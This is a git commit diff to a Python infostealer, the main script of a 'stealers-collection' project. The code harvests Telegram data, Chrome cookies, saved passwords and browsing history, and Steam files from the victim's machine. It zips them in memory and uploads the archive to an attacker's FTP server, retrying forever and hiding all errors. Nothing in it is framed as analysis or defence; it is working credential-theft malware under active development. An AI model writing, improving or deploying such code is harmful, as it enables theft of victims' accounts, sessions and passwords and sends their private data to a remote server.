9c6bc3d701ab9318f8a86378d9a948d7f0b0f593
Ghost Bear <ghost.bear.19@gmail.com>
2020-12-08 17:17:30 +0200

    Folder upload -> Archive upload

--- stealers-collection/main.py
+++ stealers-collection/main.py
@@ -3,20 +3,9 @@ import config
 from os import path
 from ftplib import FTP
 import traceback
+import io
+from zipfile import ZipFile
 
-def _storbinary(self, *args, count = 50, **kwargs):
-	if count < 1:
-		raise ValueError(f"Count must be greate than 0, have {count}")
-	cash = None
-	for i in range(count):
-		try:
-			return self._storbinary(*args, **kwargs)
-		except ConnectionResetError as e:
-			cash = e
-	raise cash
-
-FTP._storbinary = FTP.storbinary
-FTP.storbinary = _storbinary
 
 def main():
 	# FTP module to connect server
@@ -26,35 +15,61 @@ def main():
 	ftp.login(config.LOGIN, config.PASSWORD)
 	ftp.cwd(config.FOLDER)
 
+	archive_bytes = io.BytesIO()
+
+	archive = ZipFile(archive_bytes, "w")
+
 	try:
 		telegram = stealers.telegram.steal()
-		ftp.storbinary(f"STOR {path.basename('telegram.zip')}", telegram, config.BUFFER_SIZE)
+		with archive.open("telegram.zip", "w") as f:
+			f.write(telegram.read())
 	except:
 		pass
 
 	try:
 		chrome_cookies = stealers.chrome.cookies.steal()
-		ftp.storbinary(f"STOR {path.basename('chrome.cookies.sqlite')}", chrome_cookies, config.BUFFER_SIZE)
+		with archive.open("chrome.cookies.sqlite", "w") as f:
+			f.write(chrome_cookies.read())
 	except:
 		pass
 
 	try:
 		chrome_passwords = stealers.chrome.passwords.steal()
-		ftp.storbinary(f"STOR {path.basename('chrome.passwords.sqlite')}", chrome_passwords, config.BUFFER_SIZE)
+		with archive.open("chrome.passwords.sqlite", "w") as f:
+			f.write(chrome_passwords.read())
 	except:
 		pass
 
 	try:
 		chrome_history = stealers.chrome.history.steal()
-		ftp.storbinary(f"STOR {path.basename('chrome.history.sqlite')}", chrome_history, config.BUFFER_SIZE)
+		with archive.open("chrome.history.sqlite", "w") as f:
+			f.write(chrome_history.read())
 	except:
 		pass
 
 	try:
 		steam = stealers.steam.steal()
-		ftp.storbinary(f"STOR {path.basename('steam.zip')}", steam, config.BUFFER_SIZE)
+		with archive.open("steam.zip", "w") as f:
+			f.write(steam.read())
 	except:
 		pass
 
+	archive.close()
+
+	archive_bytes.seek(0)
+
+	files = ftp.nlst()
+
+	c = 1
+
+	while f'stealed{c}.zip' in files:
+		c += 1
+
+	while True:
+		try:
+			ftp.storbinary(f"STOR {path.basename(f'stealed{c}.zip')}", archive_bytes, config.BUFFER_SIZE)
+			break
+		except:
+			pass
 if __name__ == "__main__":
 	main()
